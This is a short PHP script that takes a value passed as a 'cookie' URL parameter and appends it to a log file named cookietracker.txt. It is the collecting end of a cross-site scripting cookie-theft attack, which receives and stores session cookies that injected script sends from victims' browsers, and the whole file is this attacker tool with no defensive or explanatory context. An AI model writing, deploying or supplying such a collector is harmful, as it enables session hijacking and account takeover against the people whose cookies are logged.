<?php
$cookie = $HTTP_GET_VARS["cookie"];
$file = fopen('cookietracker.txt','a');
fwrite($file, $cookie . "\n\n");
?>
